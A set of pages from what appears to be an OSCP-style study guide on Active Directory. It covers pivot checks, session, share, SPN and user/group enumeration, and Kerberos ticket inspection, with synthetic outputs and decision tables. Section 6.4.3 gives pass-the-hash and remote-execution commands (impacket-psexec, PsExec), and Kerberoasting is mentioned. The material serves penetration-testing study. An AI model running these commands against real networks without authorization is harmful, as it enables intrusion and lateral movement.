[Study mechanisms and alternatives](../methods/ad-identities.md). [Shared concepts](../Master_Notes.md). [§6.6.2 — Choose an approach](method-choice.md).

pages.title: 6.1.2 Validate routes, naming and pivot connectivity
pages.markdown: # 6.1.2 Validate routes, naming and pivot connectivity [AD cheatsheet](../../cheatsheets/active-directory.md) | [§6 — AD Notes](README.md) | [§6.5.3 — Read output](read-output.md) A known source host/vantage point and scoped destination. If pivoting is needed, first establish the pivot's real interfaces/routes and connectivity. **Where to look:** Draw source -> tunnel/forward -> destination service, plus DNS and any callback/delivery paths. Test the connection from the actual initiating host. Use a fixed forward for one service, SOCKS for supported TCP clients or a routed tunnel when its capabilities are needed. **Expected behavior / secure boundary:** A host can reach a subnet that Kali cannot. SOCKS does not automatically carry raw SYN, ICMP, UDP or every DNS request. An IP route working does not establish Kerberos FQDN/SPN correctness. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. ## 6.1.2.1 Baseline network position on Linux > **Run:** Controlled Linux host. **Requires:** Current shell; some process/socket ownership fields require more privilege. **Effect:** Reads interfaces, routes, neighbors, listeners and resolver configuration. ```bash id ip -brief address ip route ip neigh ss -lntup cat /etc/resolv.conf ``` ## 6.1.2.2 Baseline network position on Windows > **Run:** Controlled Windows host. **Requires:** Current shell; some fields can be restricted. **Effect:** Reads token and network position. ```cmd whoami /all ipconfig /all route print arp -a netstat -ano ``` **What this checks:** These are network-position discovery commands, not an instruction to install a tunnel. Use the owning pivot procedure to select OpenSSH, Chisel or Ligolo-ng after understanding direction, privileges and transport. ## 6.1.2.3 Interpret the output **Normalized observations:** the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. ```text Kali -> APP01 TCP/443: reachable APP01 -> DC01 TCP/389: reachable Kali -> DC01 TCP/389: timeout SOCKS client TCP connection works; raw scan fails ``` | Interpreted result | What it establishes | Required next check | Continue at | | --- | --- | --- | --- | | APP01 can reach DC01 | The pivot has a potential service path. | Choose a compatible forward/proxy/route from Kali via APP01. | [§6.1.2.1 — Validate routes, naming and pivot connectivity](routes.md#s-6-1-2-1) | | Kali timeout | Direct Kali reachability was not established. | Do not interpret it as a rejected domain password. | [§6.1.1.1 — Establish the current identity and domain](context.md#s-6-1-1-1) | | Raw scan fails through SOCKS | The tool may be using an unsupported transport. | Select TCP-connect/native-proxy behavior or the appropriate routed solution. | [§6.1.2.1 — Validate routes, naming and pivot connectivity](routes.md#s-6-1-2-1) | **Stop when:** The required service, DNS and any callback path are tested from the correct source. **Revisit only when:** A host, interface, subnet, tunnel or connection direction changes. ## 6.1.2.4 Decide and continue | Result | Decision | Next numbered section | | --- | --- | --- | | Enabled after validation | The required transport and DNS path work: retry the one relevant service check. | [§6.4.1.1 — Select a compatible remote-access mechanism](movement.md#s-6-4-1-1) | | Ruled out in this context | The pivot itself cannot reach the service: a tunnel cannot invent upstream reachability. | [§6.1.2.1 — Validate routes, naming and pivot connectivity](routes.md#s-6-1-2-1) | | Inconclusive / failed check | Callback or DNS is untested: retain the separate gap rather than declaring the whole route working. | [§6.5.1.1 — Diagnose the failed boundary](failure.md#s-6-5-1-1) | ## 6.1.2.5 Tooling and complete procedure Built-in route/interface commands first. OpenSSH/Chisel/Ligolo-ng are later alternatives selected by connection direction and protocol; no installation or tunnel execution is performed for concept notes. The commands above are extracts from the owning procedure; Windows-host and Kali/target tool availability must be checked in that environment. No installation or target execution is implied by this page. [Open the owning procedure, prerequisites and complete variants](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md#2-discover-the-pivots-network-position). [Study mechanisms and alternatives](../methods/pivoting.md). [Shared concepts](../Master_Notes.md). [§6.6.2 — Choose an approach](method-choice.md).

pages.title: 6.5.4 Expected behavior and useful security boundaries
pages.markdown: # 6.5.4 Expected behavior and useful security boundaries [AD cheatsheet](../../cheatsheets/active-directory.md) | [§6 — AD Notes](README.md) Use these as contextual expectations, not a claim that every organization uses one default configuration. Check the exact object, policy, version and effective permissions. | Investigation | Often expected / intended | Interesting clue requiring validation | Do not conclude | | --- | --- | --- | --- | | Directory reads | Authenticated users can read many users/groups/SPNs | Secret-bearing readable attributes or excessive useful object rights | LDAP read access means directory administration | | SYSVOL / NETLOGON | Domain users read policy and logon material | Readable secrets, or controlled content with a useful privileged consumer | SYSVOL readability itself is a vulnerability | | Service SPNs | Services register Kerberos identities | Useful account plus feasible offline password recovery | An SPN is a weak password | | Preauthentication | Normally required for Kerberos accounts | Explicitly disabled on an account with compatible request conditions | A timeout proves no-preauth or password validity | | Groups / ACLs | Narrow intended administrative delegation | A controlled trustee has effective unintended useful control | A group name or one ACE proves effective access | | Remote access | Service-specific rights restrict host logon/execution | A useful reachable endpoint authorizes the controlled identity | Valid domain credentials mean remote execution | | Sessions | Users log on and network sessions appear/disappear | A fresh valuable session on a host you can suitably control | A session guarantees accessible plaintext credentials | | LAPS / gMSA | Managed random credentials and restricted reads | Excessive usable read/decryption rights on useful accounts | Merely seeing the object is a weakness | | Credential protection | Protection varies with OS, policy and runtime state | A source is actually accessible with suitable privileges | An absent registry value proves protection is disabled | | Replication | DCs and deliberately delegated services replicate | Controlled principal has effective secret-replication rights | Member-server local admin implies DCSync | | AD CS / GPO / delegation | Legitimate enterprise functionality | The complete selected misuse conditions align | A scanner label or isolated flag proves exploitation | For each clue, record: **object/host -> current identity -> exact observed permission/configuration -> missing condition -> decisive check -> resulting capability**. Use the [AD cheatsheet](../../cheatsheets/active-directory.md) for commands and next decisions; the [§6 — investigation index](README.md) links annotated examples. [Complete AD procedures](../../reference/06-ad-lateral-movement/README.md) | [Mechanisms](../Master_Notes.md)

pages.title: 6.2.7 Enumerate and interpret sessions
pages.markdown: # 6.2.7 Enumerate and interpret sessions [AD cheatsheet](../../cheatsheets/active-directory.md) | [§6 — AD Notes](README.md) | [§6.5.3 — Read output](read-output.md) A scoped candidate host and permission to perform the selected session query. Other users' live credential material needs separate host privileges and protection checks. **Where to look:** Inspect session evidence only on relevant hosts. Record who, which host, how collected and when. Join the observation to your actual ability to access/control that host; then select a justified credential source. **Expected behavior / secure boundary:** User sessions are ordinary and volatile. Modern Windows can restrict enumeration. An empty or denied result is not proof of no sessions, and a session does not guarantee accessible or reusable credentials. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. ## 6.2.7.1 Session enumeration using PowerView > **Run:** Windows PowerShell with reviewed PowerView. **Requires:** RPC/API connectivity and the query-specific rights on selected hosts. **Effect:** Queries session evidence; denial means incomplete coverage. ```powershell Get-NetSession -ComputerName COMPUTER -Verbose Get-NetLoggedon -ComputerName COMPUTER ``` ## 6.2.7.2 Session enumeration using PsLoggedOn > **Run:** Windows with PsLoggedOn. **Requires:** Relevant Remote Registry/session connectivity and permissions. **Effect:** Queries logon evidence; the query itself can create a network session. ```cmd PsLoggedOn.exe \\COMPUTER ``` **What this checks:** Session tools use different APIs/evidence. Remote Registry/profile artifacts, network sessions and interactive logons are not identical observations. The query itself can create network-session noise. ## 6.2.7.3 Interpret the output **Normalized observations:** the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. ```text Computer: APP01 UserName: EXAMPLE\admin_ops Source: Session collection Other host: Access denied ``` | Interpreted result | What it establishes | Required next check | Continue at | | --- | --- | --- | --- | | admin_ops on APP01 | A time-bound session candidate. | Verify freshness, host control and what kind of session was observed. | [§6.2.6.1 — Validate host-specific access rights](hosts.md#s-6-2-6-1) | | You only have a low-privilege APP01 shell | You can run as yourself there. | Establish a privilege path before assuming process-memory access. | [§6.3.5.1 — Select a credential source on a controlled host](credential-sources.md#s-6-3-5-1) | | Access denied | The collector lacked a needed right or access path. | Use another authorized source; mark this collection inconclusive. | [§6.2.7.1 — Enumerate and interpret sessions](sessions.md#s-6-2-7-1) | **Stop when:** Source, time and collection coverage are recorded for the selected host. **Revisit only when:** The session ages out or a relevant new host-control capability appears. ## 6.2.7.4 Decide and continue | Result | Decision | Next numbered section | | --- | --- | --- | | Enabled after validation | Fresh useful session plus suitable host privileges: inspect the appropriate credential/ticket source. | [§6.3.5.1 — Select a credential source on a controlled host](credential-sources.md#s-6-3-5-1) | | Ruled out in this context | You cannot control the relevant host or the session has ended: deprioritize that transition. | [§6.2.5.1 — Enumerate and validate effective object permissions](acl.md#s-6-2-5-1) | | Inconclusive / failed check | Denied/empty collection: retain uncertainty and use directory/object-right leads. | [§6.2.8.1 — Enumerate using BloodHound and validate relationships](bloodhound.md#s-6-2-8-1) | ## 6.2.7.5 Tooling and complete procedure PowerView session functions or PsLoggedOn are targeted alternatives. RPC/Remote Registry, platform restrictions and query privileges determine what each can see. The commands above are extracts from the owning procedure; Windows-host and Kali/target tool availability must be checked in that environment. No installation or target execution is implied by this page. [Open the owning procedure, prerequisites and complete variants](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/01-domain-mapping.md#11-sessions-are-volatile-hints). [Study mechanisms and alternatives](../methods/ad-mapping.md). [Shared concepts](../Master_Notes.md). [§6.6.2 — Choose an approach](method-choice.md).

pages.title: 6.2.2 Enumerate shares, SYSVOL and NETLOGON
pages.markdown:
# 6.2.2 Enumerate shares, SYSVOL and NETLOGON [AD cheatsheet](../../cheatsheets/active-directory.md) | [§6 — AD Notes](README.md) | [§6.5.3 — Read output](read-output.md) A reachable SMB endpoint and an identified anonymous, local or domain authentication context. These contexts must be recorded separately. **Where to look:** Begin with SYSVOL/NETLOGON on a DC and relevant application, deployment or IT shares discovered on scoped hosts. Inspect logon scripts, installation configuration, backups and references to other servers. List before retrieving selected files. **Expected behavior / secure boundary:** Domain-user read access to SYSVOL and NETLOGON is generally intentional. Directory listing, file reading and file writing are separate permissions. Share names, dollar suffixes and a READ label do not settle an individual file's effective access. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. ## 6.2.2.1 Baseline share enumeration from Windows > **Run:** Windows. **Requires:** Selected SMB server; current network identity and share/object permissions. **Effect:** Lists shares/directories; does not test file write or execution. ```cmd net view \\DC_HOST dir \\DC_HOST\SYSVOL dir \\DC_HOST\NETLOGON ``` ## 6.2.2.2 Share enumeration using Kali SMB clients > **Run:** Kali / Linux. **Requires:** SMB connectivity and explicit DOMAIN/USER context; smbclient may prompt for its password. **Effect:** Lists shares/files; get retrieves only a selected authorized file. ```bash nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' --shares smbclient -L //DC_IP -U 'DOMAIN/USER' smbclient //DC_IP/SYSVOL -U 'DOMAIN/USER' -c 'recurse ON; ls' smbclient //DC_IP/SHARE -U 'DOMAIN/USER' ``` **What this checks:** net view and --shares inventory share-level candidates. smbclient then tests the named share with an explicit identity; ls, cd and get test progressively narrower objects. A successful file read can disclose information without granting execution. ## 6.2.2.3 Interpret the output **Raw/view evidence first.** These are synthetic, abbreviated tool or graph-view excerpts. Graph relationship rows are a representative view, not collector console output. Version-specific wording and spacing can differ. The normalized observations below are a separate interpretation.
6.2.2.3.1 Expected — raw evidence **Command/view:** smbclient -L //DC_IP -U DOMAIN/USER ```text Sharename Type Comment --------- ---- ------- NETLOGON Disk Logon server share SYSVOL Disk Logon server share ``` **Decisive clue:** SYSVOL and NETLOGON appear in the inventory. **Supported:** Share names were listed in this authentication context. **Still missing:** Connecting, listing a directory and reading a selected file remain separate operations. **Next check:** [§6.2.2.1 — Enumerate shares, SYSVOL and NETLOGON](shares.md#s-6-2-2-1)
6.2.2.3.2 Interesting — raw evidence **Command/view:** Selected file retrieval and its contents ```text smb: \scripts\> get map-drives.ps1 getting file \scripts\map-drives.ps1 as map-drives.ps1 File content: $share = "\\FS01\Finance" ``` **Decisive clue:** FS01 and Finance in the readable script. **Supported:** A host/share reference was found through a demonstrated file read. **Still missing:** Scope, address, reachability and current-identity access to that share remain untested. **Next check:** [§6.2.6.1 — Validate host-specific access rights](hosts.md#s-6-2-6-1)
6.2.2.3.3 Failed / inconclusive — raw evidence **Command/view:** get config.ini inside an authenticated share session ```text NT_STATUS_ACCESS_DENIED opening remote file \config.ini ``` **Decisive clue:** The selected file open was denied. **Supported:** This file read failed; retain any already-proven authentication/listing. **Still missing:** Determine the relevant object permission or use another permitted artifact; do not infer no credentials exist anywhere. **Next check:** [§6.5.1.1 — Diagnose the failed boundary](failure.md#s-6-5-1-1)
**Normalized observations:** the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. ```text Share: SYSVOL READ Share: Deploy READ Deploy/scripts/map-drives.ps1 File content: $share = "\\FS01\Finance" ``` | Interpreted result | What it establishes | Required next check | Continue at | | --- | --- | --- | --- | | SYSVOL READ | Expected directory access can be available. | Inspect relevant scripts/policy material; do not report readability alone as a weakness. | [§6.2.3.1 — Interpret scripts, configuration and exposed secrets](files.md#s-6-2-3-1) | | map-drives.ps1 | A selected script contains a host/share reference. | Record FS01 and Finance, check scope/address and test access with the current identity. | [§6.2.6.1 — Validate host-specific access rights](hosts.md#s-6-2-6-1) | | NT_STATUS_ACCESS_DENIED on get | The requested read was denied. | Retain successful authentication/listing evidence; inspect another authorized object. | [§6.5.1.1 — Diagnose the failed boundary](failure.md#s-6-5-1-1) | **Stop when:** The selected share/file access boundary and any useful clue are recorded. **Revisit only when:** A new credential, permission or referenced file changes the access context. ## 6.2.2.4 Decide and continue | Result | Decision | Next numbered section | | --- | --- | --- | | Enabled after validation | A readable file contains a credential-shaped value: classify its type and identity before reuse. | [§6.3.2.1 — Classify recovered credentials and their scope](material.md#s-6-3-2-1) | | Ruled out in this context | A relevant share is unreadable with this identity: mark that access context ruled out and continue. | [§6.2.1.1 — Baseline enumeration — users and groups](users.md#s-6-2-1-1) | | Inconclusive / failed check | Listing works but file reading is untested: keep the content claim inconclusive. | [§6.2.2.1 — Enumerate shares, SYSVOL and NETLOGON](shares.md#s-6-2-2-1) | ## 6.2.2.5 Tooling and complete procedure smbclient on Kali is the baseline for explicit SMB file interaction; net.exe/dir are Windows alternatives. NetExec summarizes share candidates. SMB connectivity and correct account scope are required. The commands above are extracts from the owning procedure; Windows-host and Kali/target tool availability must be checked in that environment. No installation or target execution is implied by this page. [Open the owning procedure, prerequisites and complete variants](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/01-domain-mapping.md#7-shares-sysvol-and-netlogon). [Study mechanisms and alternatives](../methods/ad-mapping.md). [Shared concepts](../Master_Notes.md). [§6.6.2 — Choose an approach](method-choice.md).

pages.title: 6.4.3 Execute using SMB or WMI mechanisms
pages.markdown: # 6.4.3 Execute using SMB or WMI mechanisms [AD cheatsheet](../../cheatsheets/active-directory.md) | [§6 — AD Notes](README.md) | [§6.5.3 — Read output](read-output.md) A scoped host, compatible authentication and verified remote execution rights. A visible writable share alone is insufficient. **Where to look:** For service-based execution inspect administrative share/file delivery and service-control rights. For WMI/DCOM inspect RPC endpoint/dynamic transport and namespace/COM authorization. Track execution separately from output retrieval. **Expected behavior / secure boundary:** Remote administrative execution is deliberately privileged. A local Administrators membership can be affected by remote token filtering/policy. An output-file failure can occur after execution; avoid blindly rerunning a state-changing command. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. ## 6.4.3.1 SMB execution using Impacket > **Run:** Kali / Linux with Impacket. **Requires:** Required administrative share/service-control rights and compatible authentication. **Effect:** Remote execution; may upload files and create/remove a service. ### 6.4.3.1.1 Password ```bash # Password impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET' ``` ### 6.4.3.1.2 NT hash / Pass-the-Hash ```bash # NT hash / Pass-the-Hash impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` ## 6.4.3.2 SMB execution using native Windows PsExec > **Run:** Windows with Sysinternals PsExec. **Requires:** Required target administrative/service rights and selected credentials. **Effect:** Remote execution/service activity; first use can accept the tool EULA. ```cmd PsExec64.exe -accepteula \\TARGET_HOST -u DOMAIN\USER -p PASSWORD cmd.exe ``` **What this checks:** PsExec-style and SMBExec-style mechanisms differ in service, file and output handling. They require their respective access paths. WMI is a separate mechanism with RPC/dynamic-port requirements, documented in the linked full procedure. ## 6.4.3.3 Interpret the output **Normalized observations:** the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. ```text SMB authentication: success ADMIN$ file upload: access denied WMI: process created, return value 0 Output retrieval: failed ``` | Interpreted result | What it establishes | Required next check | Continue at | | --- | --- | --- | --- | | ADMIN$ upload denied | The selected delivery step lacks access. | Recheck administrative context or choose a method whose actual requirements are satisfied. | [§6.2.6.1 — Validate host-specific access rights](hosts.md#s-6-2-6-1) | | WMI return 0 | The process-creation API accepted the request. | Verify its effect/output and run-as identity; no interactive shell is implied. | [§6.5.2.1 — Re-enumerate after an identity or host change](reenumerate.md#s-6-5-2-1) | | Output retrieval failed | The result channel failed. | Check whether execution already happened before retrying. | [§6.5.1.1 — Diagnose the failed boundary](failure.md#s-6-5-1-1) | **Stop when:** Execution acceptance, run-as identity, effect and output-channel result are separated. **Revisit only when:** New service/file/RPC rights or result-channel evidence appears. ## 6.4.3.4 Decide and continue | Result | Decision | Next numbered section | | --- | --- | --- | | Enabled after validation | The chosen mechanism executes and verifies the intended identity: record the transition. | [§6.5.2.1 — Re-enumerate after an identity or host change](reenumerate.md#s-6-5-2-1) | | Ruled out in this context | Required service/file/namespace rights are denied: reject that mechanism in this context. | [§6.4.1.1 — Select a compatible remote-access mechanism](movement.md#s-6-4-1-1) | | Inconclusive / failed check | Command submission works but output is absent: diagnose the result channel without assuming no execution. | [§6.5.1.1 — Diagnose the failed boundary](failure.md#s-6-5-1-1) | ## 6.4.3.5 Tooling and complete procedure Impacket PsExec/SMBExec/WMIExec or native Windows CIM/Sysinternals alternatives. SMB/service rights and RPC routes differ; use the exact source procedure for the selected mechanism. The commands above are extracts from the owning procedure; Windows-host and Kali/target tool availability must be checked in that environment. No installation or target execution is implied by this page. [Open the owning procedure, prerequisites and complete variants](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/05-lateral-movement.md#4-smb-and-service-control-execution). [Study mechanisms and alternatives](../methods/lateral-movement.md). [Shared concepts](../Master_Notes.md). [§6.6.2 — Choose an approach](method-choice.md).

pages.title: 6.2.4 Enumerate service accounts and SPNs
pages.markdown:
# 6.2.4 Enumerate service accounts and SPNs [AD cheatsheet](../../cheatsheets/active-directory.md) | [§6 — AD Notes](README.md) | [§6.5.3 — Read output](read-output.md) A domain directory query context, with user/group enumeration available. **Where to look:** Inspect servicePrincipalName on selected accounts. Associate the service class, hostname and port with the owning user/computer, its groups, account state and useful rights. User-backed service identities and machine accounts have different typical password conditions. **Expected behavior / secure boundary:** SPNs are normal Kerberos registrations. A service ticket being requestable is expected behavior and does not prove a weak password, reachable service or privileged account. Long random managed/computer secrets are usually poor offline-guessing candidates. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. ## 6.2.4.1 Baseline SPN queries using setspn > **Run:** Windows with setspn available. **Requires:** Tool execution prerequisites and permitted domain directory queries; do not assume the binary is installed. **Effect:** Lists registrations; the shown -Q/-L forms do not add SPNs. ```cmd setspn -Q */* setspn -L ACCOUNT ``` ## 6.2.4.2 SPN enumeration using PowerView > **Run:** Windows PowerShell with reviewed PowerView. **Requires:** Loaded compatible module and authenticated directory query context. **Effect:** Reads SPN-owning account attributes. ```powershell Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof,useraccountcontrol,pwdlastset ``` **What this checks:** setspn inventories registrations; PowerView joins SPNs to account attributes. This is account/service mapping. Requesting offline guessing material and deciding whether cracking is worthwhile belong to the next page. ## 6.2.4.3 Interpret the output **Raw/view evidence first.** These are synthetic, abbreviated tool or graph-view excerpts. Graph relationship rows are a representative view, not collector console output. Version-specific wording and spacing can differ. The normalized observations below are a separate interpretation.
6.2.4.3.1 Expected — raw evidence **Command/view:** setspn -L ACCOUNT (computer-account example) ```text Registered ServicePrincipalNames for CN=WS01,OU=Computers,DC=example,DC=test: HOST/WS01 HOST/WS01.example.test ``` **Decisive clue:** HOST registrations on a computer account. **Supported:** These are ordinary service-identity registrations. **Still missing:** No weak secret or useful controlled account right was demonstrated. **Next check:** [§6.2.1.1 — Baseline enumeration — users and groups](users.md#s-6-2-1-1)
6.2.4.3.2 Interesting — raw evidence **Command/view:** setspn -L ACCOUNT (user-backed service example) ```text Registered ServicePrincipalNames for CN=svc_reports,OU=Services,DC=example,DC=test: MSSQLSvc/DB01.example.test:1433 ``` **Decisive clue:** MSSQLSvc registration owned by svc_reports. **Supported:** The account/service relationship is a selected Kerberoasting candidate. **Still missing:** Account value/type, ticket-request prerequisites and offline feasibility still determine usefulness. **Next check:** [§6.3.4.1 — Kerberoasting — selection and output](kerberoast.md#s-6-3-4-1)
6.2.4.3.3 Failed / inconclusive — raw evidence **Command/view:** PowerShell directory-query failure excerpt ```text Exception calling "FindAll" with "0" argument(s): "The server is not operational." ``` **Decisive clue:** The directory query did not complete. **Supported:** No complete SPN inventory was obtained. **Still missing:** Check selected directory server, authentication context and route; this is not proof of no SPNs. **Next check:** [§6.1.1.1 — Establish the current identity and domain](context.md#s-6-1-1-1)
**Normalized observations:** the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. ```text samaccountname: svc_reports serviceprincipalname: MSSQLSvc/DB01.example.test:1433 memberof: CN=Reporting Operators,OU=Groups,DC=example,DC=test ``` | Interpreted result | What it establishes | Required next check | Continue at | | --- | --- | --- | --- | | MSSQLSvc | A SQL Server service-class registration. | Associate it with DB01:1433; verify reachability separately. | [§6.2.6.1 — Validate host-specific access rights](hosts.md#s-6-2-6-1) | | svc_reports | The SPN-owning account. | Inspect account type, groups and useful permissions. | [§6.2.1.1 — Baseline enumeration — users and groups](users.md#s-6-2-1-1) | | Reporting Operators | An account-value clue. | Determine actual rights rather than inferring privilege from the group name. | [§6.2.5.1 — Enumerate and validate effective object permissions](acl.md#s-6-2-5-1) | **Stop when:** The service registration is tied to its owning account and a concrete account-value question. **Revisit only when:** A new account right, service route or justified password strategy changes the value. ## 6.2.4.4 Decide and continue | Result | Decision | Next numbered section | | --- | --- | --- | | Enabled after validation | A user SPN account has useful rights and compatible request conditions: consider selected Kerberoasting. | [§6.3.4.1 — Kerberoasting — selection and output](kerberoast.md#s-6-3-4-1) | | Ruled out in this context | The account offers no useful transition or has an infeasible managed secret: deprioritize offline guessing. | [§6.2.5.1 — Enumerate and validate effective object permissions](acl.md#s-6-2-5-1) | | Inconclusive / failed check | The service is unreachable: account enumeration still stands; remote service access remains unproved. | [§6.2.6.1 — Validate host-specific access rights](hosts.md#s-6-2-6-1) | ## 6.2.4.5 Tooling and complete procedure setspn is the Windows baseline; reviewed PowerView or LDAP provides attributes. The PowerView module must already be loaded and compatible. The commands above are extracts from the owning procedure; Windows-host and Kali/target tool availability must be checked in that environment. No installation or target execution is implied by this page. [Open the owning procedure, prerequisites and complete variants](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/01-domain-mapping.md#8-service-accounts-and-spns). [Study mechanisms and alternatives](../methods/ad-mapping.md). [Shared concepts](../Master_Notes.md). [§6.6.2 — Choose an approach](method-choice.md).

pages.title: 6.3.6 Inspect Kerberos tickets and compatible use
pages.markdown: # 6.3.6 Inspect Kerberos tickets and compatible use [AD cheatsheet](../../cheatsheets/active-directory.md) | [§6 — AD Notes](README.md) | [§6.5.3 — Read output](read-output.md) Access to the current logon session's ticket cache, or an explicitly obtained ticket file. Other LUIDs typically need elevation. **Where to look:** Inspect client identity/realm, server SPN, start/end/renewal times, ticket type and file format. Identify which process/logon session or ccache actually uses the ticket. **Expected behavior / secure boundary:** TGTs and service tickets in an authenticated session are ordinary. A ticket does not reveal a password, grant local administrator rights or authorize every service. The local process identity can differ from its network Kerberos identity. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. ## 6.3.6.1 Baseline — Windows command prompt > **Run:** Windows. **Requires:** Current cache for ordinary inspection; session-wide enumeration can need elevation. **Effect:** Reads ticket metadata; does not purge or import tickets. ```cmd klist klist tgt klist sessions ``` **What this checks:** klist inventories cache metadata. TGTs address krbtgt/REALM; a cifs/HOST or HTTP/HOST ticket targets a specific service. sessions enumeration can need extra rights. Do not purge a cache while diagnosing it. ## 6.3.6.2 Interpret the output **Normalized observations:** the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. ```text Client: analyst @ EXAMPLE.TEST Server: cifs/FS01.example.test @ EXAMPLE.TEST End Time: already expired Another ticket: krbtgt/EXAMPLE.TEST ``` | Interpreted result | What it establishes | Required next check | Continue at | | --- | --- | --- | --- | | cifs/FS01 | An SMB service-scoped ticket. | Use a compatible client and matching hostname/SPN; check authorization separately. | [§6.4.1.1 — Select a compatible remote-access mechanism](movement.md#s-6-4-1-1) | | Expired End Time | This ticket is outside its validity window. | Obtain a legitimate current ticket/context; importing it does not repair expiry. | [§6.3.6.1 — Inspect Kerberos tickets and compatible use](tickets.md#s-6-3-6-1) | | krbtgt/EXAMPLE.TEST | A TGT, not a universal service ticket. | Check KDC connectivity, realm and downstream service-ticket requests. | [§6.1.1.1 — Establish the current identity and domain](context.md#s-6-1-1-1) | **Stop when:** Client, realm, SPN, validity and selected cache/logon context are understood. **Revisit only when:** Ticket validity, cache context, hostname or represented identity changes. ## 6.3.6.3 Decide and continue | Result | Decision | Next numbered section | | --- | --- | --- | | Enabled after validation | Identity, validity, SPN and client cache context match: test the intended service authorization. | [§6.4.1.1 — Select a compatible remote-access mechanism](movement.md#s-6-4-1-1) | | Ruled out in this context | Wrong SPN, expired ticket or incompatible file format: rule out that attempted use until corrected. | [§6.3.6.1 — Inspect Kerberos tickets and compatible use](tickets.md#s-6-3-6-1) | | Inconclusive / failed check | Ticket loaded but service fails: separate DNS/time, authentication and endpoint rights. | [§6.5.1.1 — Diagnose the failed boundary](failure.md#s-6-5-1-1) | ## 6.3.6.4 Tooling and complete procedure Windows klist is the first inspection tool; Linux klist uses the selected ccache. Rubeus/Impacket converters and key-to-ticket variants are in the linked complete procedure. The commands above are extracts from the owning procedure; Windows-host and Kali/target tool availability must be checked in that environment. No installation or target execution is implied by this page. [Open the owning procedure, prerequisites and complete variants](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/02-credential-access.md#3-inspect-tickets-before-invasive-collection). [Study mechanisms and alternatives](../methods/ad-identities.md). [Shared concepts](../Master_Notes.md). [§6.6.2 — Choose an approach](method-choice.md).

pages.title: 6.2.1 Baseline enumeration — users and groups
pages.markdown:
# 6.2.1 Baseline enumeration — users and groups [AD cheatsheet](../../cheatsheets/active-directory.md) | [§6 — AD Notes](README.md) | [§6.5.3 — Read output](read-output.md) A working domain query context. Native Windows commands use the current network context; off-domain clients need explicit supported authentication. **Where to look:** Query domain users, then expand selected accounts and custom or privileged groups. Follow direct and nested memberships toward an actual object right or host permission. Inspect descriptions and account state without assuming names reveal privileges. **Expected behavior / secure boundary:** Authenticated directory reads and membership in Domain Users are ordinarily expected. Administrative-looking names, adminCount and old password dates are leads, not proof of current administrative rights. A direct memberOf list may omit nested and primary-group relationships. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. ## 6.2.1.1 Baseline enumeration with native Windows commands > **Run:** Windows. **Requires:** Current domain query context; /domain selects directory rather than local accounts. **Effect:** Reads user, group and policy information. ```cmd net user /domain net user USER /domain net group /domain net group "Domain Admins" /domain net group "GROUP" /domain net accounts /domain nltest /domain_trusts /all_trusts net view /domain net view \\DC_HOST ``` ## 6.2.1.2 Enumeration using RSAT PowerShell > **Run:** Windows PowerShell with RSAT. **Requires:** ActiveDirectory module plus permitted authenticated directory access. **Effect:** Reads directory objects; does not grant the returned memberships. ```powershell Get-Command -Module ActiveDirectory Get-ADDomain Get-ADForest Get-ADDomainController -Filter * Get-ADUser -Filter * -Properties Enabled,Description,MemberOf,ServicePrincipalName,UserPrincipalName,PasswordLastSet,LastLogonDate,AdminCount Get-ADGroup -Filter * -Properties GroupScope,GroupCategory,Members,Description Get-ADGroupMember -Identity 'GROUP' -Recursive Get-ADComputer -Filter * -Properties DNSHostName,OperatingSystem,OperatingSystemVersion,ServicePrincipalName,TrustedForDelegation,LastLogonDate Get-ADTrust -Filter * ``` **What this checks:** The /domain switch selects domain objects rather than the local SAM. User detail connects an account to memberships; group detail identifies principals to investigate. RSAT adds structured queries only when its module exists. ## 6.2.1.3 Interpret the output **Raw/view evidence first.** These are synthetic, abbreviated tool or graph-view excerpts. Graph relationship rows are a representative view, not collector console output. Version-specific wording and spacing can differ. The normalized observations below are a separate interpretation.
